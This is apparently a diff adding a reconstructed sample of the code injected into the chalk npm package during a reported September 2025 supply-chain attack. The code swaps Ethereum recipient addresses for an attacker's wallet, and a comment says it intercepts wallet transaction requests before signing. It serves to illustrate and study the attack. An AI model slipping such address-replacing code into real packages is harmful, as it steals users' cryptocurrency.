@@ -1,0 +1,19 @@
+# Source: https://blockaid.io/blog/attack-report-the-september-2025-npm-supply-chain-attack
+# Event: September 2025 NPM Supply Chain Attack - Wallet Address Replacement (2025-09-08)
+# Report: Blockaid + Check Point "The Great NPM Heist" - 2B+ weekly downloads affected
+[Reconstructed: malicious code injected into chalk, debug, and related npm packages]
+// Injected into node_modules/chalk/index.js (line 847, obfuscated)
+const _0x3f2a = ['0xATTACKER_WALLET_ADDR_REPLACE_ME_0000000', ...];
+function _checkTx(addr) {
+  // Levenshtein-similar replacement to evade detection
+  if (/^0x[a-fA-F0-9]{40}$/.test(addr)) {
+    return _0x3f2a[0]; // Replace with attacker address
+  }
+  return addr;
+}
+
+// Usage in wallet transaction interceptor
+module.exports = { ...originalChalk, _checkTx };
+
+// The compromised package intercepts window.ethereum.request calls and replaces
+// the 'to' address in eth_sendTransaction before signing.
